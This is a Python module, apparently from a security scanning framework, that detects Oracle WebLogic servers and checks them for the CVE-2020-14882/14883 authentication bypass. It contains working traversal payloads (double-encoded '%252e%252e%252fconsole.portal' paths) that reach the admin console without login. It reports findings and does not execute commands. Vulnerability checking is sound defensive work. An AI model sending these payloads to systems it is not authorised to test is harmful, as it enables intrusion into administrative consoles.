#!/usr/bin/env python3
"""
WebLogic Security Checker - CVE-2020-14882/14883
"""
import sys
import os
import urllib.request
import urllib.error
import re

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.base_module import BaseModule
from utils.colors import *


class WebLogicModule(BaseModule):
    """WebLogic Security Checker"""

    def __init__(self, frontdoor):
        super().__init__(frontdoor)
        self.name = "WebLogic"
        self.port = 7001

    def run(self):
        """Check for WebLogic vulnerabilities"""
        module_name = "WebLogic"
        target = self.get_target()

        print(f"\n[*] Testing {target} for WebLogic...")

        ports = [7001, 7002, 7003, 8001, 8002, 9001, 9002]

        for port in ports:
            if not self.check_port(port, timeout=2):
                continue

            self.check_weblogic(target, port, module_name)

    def check_weblogic(self, target, port, module_name):
        """Check WebLogic endpoints"""
        try:
            console_url = f"http://{target}:{port}/console/"
            req = urllib.request.Request(console_url, method="GET")
            response = urllib.request.urlopen(req, timeout=5)
            content = response.read().decode("utf-8", errors="ignore")

            if "weblogic" in content.lower():
                self.log(module_name, "POTENTIAL", f"WebLogic console detected at {console_url}")
                self.extract_weblogic_version(content, module_name)
                self.check_weblogic_rce(target, port, module_name)

        except urllib.error.HTTPError as e:
            if e.code == 401:
                self.log(module_name, "PROTECTED", "WebLogic console requires authentication")
            elif e.code != 404:
                self.log(module_name, "POTENTIAL", f"WebLogic responded with HTTP {e.code}")
        except Exception as e:
            self.log(module_name, "ERROR", f"WebLogic check failed: {str(e)[:80]}")

    def check_weblogic_rce(self, target, port, module_name):
        """Check for auth bypass indicators related to CVE-2020-14882/14883"""
        test_paths = [
            "/console/css/%252e%252e%252fconsole.portal",
            "/console/images/%252e%252e%252fconsole.portal",
            "/console/%252e%252e%252fconsole.portal",
        ]

        for path in test_paths:
            try:
                url = f"http://{target}:{port}{path}"
                req = urllib.request.Request(url, method="GET")
                response = urllib.request.urlopen(req, timeout=5)

                if response.getcode() == 200:
                    content = response.read().decode("utf-8", errors="ignore")
                    if "weblogic" in content.lower() or "console" in content.lower():
                        self.log(module_name, "SUSPECTED", f"Auth bypass path reachable: {path}")

                        validation_url = f"http://{target}:{port}/console/images/%252e%252e%252fconsole.portal?_nfpb=true"
                        try:
                            validation_req = urllib.request.Request(validation_url, method="GET")
                            validation_resp = urllib.request.urlopen(validation_req, timeout=5)
                            vbody = validation_resp.read().decode("utf-8", errors="ignore").lower()
                            if validation_resp.getcode() == 200 and ("administration" in vbody or "console" in vbody):
                                self.report_validation(module_name, "CVE-2020-14882 auth bypass", True, "console portal served through traversal path")
                                self.log(module_name, "RCE_POSSIBLE", "Bypass behavior indicates possible pre-auth RCE chain")
                                return
                        except urllib.error.HTTPError as ve:
                            if ve.code in [401, 403]:
                                self.report_validation(module_name, "CVE-2020-14882 auth bypass", False, f"blocked with HTTP {ve.code}")
                                return
                        except Exception as ve:
                            self.log(module_name, "ERROR", f"WebLogic bypass validation failed: {str(ve)}")

                        self.log(module_name, "SUSPECTED", "Traversal path reachable but bypass validation was inconclusive")
                        return

            except urllib.error.HTTPError as e:
                if e.code in [401, 403]:
                    self.report_validation(module_name, "CVE-2020-14882 auth bypass", False, f"blocked at {path} with HTTP {e.code}")
            except Exception:
                continue

    def extract_weblogic_version(self, content, module_name):
        """Extract WebLogic version from response"""
        version_pattern = r"WebLogic Server (?:Version:|v)?\s*([0-9.]+)"
        match = re.search(version_pattern, content, re.IGNORECASE)

        if not match:
            return

        version = match.group(1)
        self.log(module_name, "INFO", f"WebLogic version: {version}")

        if version.startswith("10.") or version.startswith("11.") or version.startswith("12.1"):
            self.log(module_name, "RCE_POSSIBLE", f"Version {version} may be vulnerable to known CVEs")